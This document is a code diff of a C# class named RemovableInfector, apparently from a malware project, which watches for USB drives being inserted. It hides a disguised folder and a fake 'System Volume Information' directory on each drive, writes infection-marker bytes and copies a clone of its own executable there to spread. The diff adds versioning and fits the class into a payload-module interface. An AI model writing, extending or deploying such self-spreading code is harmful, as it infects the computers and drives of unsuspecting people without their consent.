@@ -9,15 +9,16 @@ using File = System.IO.File;
 
 namespace zort
 {
-    public class RemovableInfector : IInfectionMethod
+    public class RemovableInfector : IPayloadModule
     {
-
-        //kabuzo hackleyeen 3000
         private readonly ManagementEventWatcher _watcher = new ManagementEventWatcher();
         private readonly byte[] RECOGNITION_BYTES = { 0x69, 0x7A, 0x42, 0x19, 0x00, 0xCC, 0xEF, 0x42 };
+        private const byte VERSION_BYTE = 0x01;
         const string FAKE_FOLDER_NAME = "‎ ";
         const string FAKE_SYSTEM_VOLUME_INFO_NAME = "System Volume Information ";
 
+        public string ModuleName => "InfectRemovables";
+        public string Description => "Infects removable drives with a fake System Volume Information folder.";
         public bool RequiresAdmin => false;
         public void Start()
         {
@@ -55,9 +56,6 @@ namespace zort
 
         private void InfectRemovableDrive(char driveLetter)
         {
-            // Code to infect the removable drive
-            Console.WriteLine($"Infecting removable drive: {driveLetter}");
-
             string drivePath = $@"{driveLetter}:\";
             // Check if the drive is removable
             if (!DriveInfo.GetDrives().Any(d => d.Name == drivePath && d.DriveType == System.IO.DriveType.Removable)) return;
@@ -68,14 +66,20 @@ namespace zort
             string fakeSystemVolumeInfoPath = Path.Combine(fakeFolderPath, FAKE_SYSTEM_VOLUME_INFO_NAME);
             string fakeFilePath = Path.Combine(fakeSystemVolumeInfoPath, "WPSettings.dat");
 
+            byte[] expectedData = new byte[RECOGNITION_BYTES.Length + 1];
+            Buffer.BlockCopy(RECOGNITION_BYTES, 0, expectedData, 0, RECOGNITION_BYTES.Length);
+            expectedData[RECOGNITION_BYTES.Length] = VERSION_BYTE;
+
             if (File.Exists(fakeFilePath))
             {
-                if (File.ReadAllBytes(fakeFilePath).SequenceEqual(RECOGNITION_BYTES))
+                //TODO: Add check for version byte for updating
+                if (File.ReadAllBytes(fakeFilePath).SequenceEqual(expectedData))
                 {
                     Console.WriteLine("Drive is already infected. Exiting.");
                     return;
                 }
             }
+            Console.WriteLine($"Infecting removable drive: {driveLetter}");
 
             // Check if the drive is writable
             if (!CanWrite(drivePath))
@@ -107,8 +111,8 @@ namespace zort
             Directory.CreateDirectory(fakeSystemVolumeInfoPath);
             Console.WriteLine($"Created fake System Volume Information folder: {fakeSystemVolumeInfoPath}");
 
-            //Create fake file in the fake folder
-            File.WriteAllBytes(fakeFilePath, RECOGNITION_BYTES);
+            //Create fake file in the fake folder containing recognition bytes and version info
+            File.WriteAllBytes(fakeFilePath, expectedData);
 
             // Copy the executable to the fake folder
             byte[] bytes = PersistenceHelper.CreateClone();
